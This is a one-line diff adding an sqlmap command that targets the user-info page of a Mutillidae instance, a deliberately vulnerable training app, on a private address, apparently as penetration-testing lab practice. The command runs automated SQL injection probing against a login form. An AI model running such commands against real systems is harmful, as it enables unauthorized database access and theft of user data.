@@ -1,0 +1,1 @@
+sqlmap -u "http://192.168.1.123/mutillidae/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details"
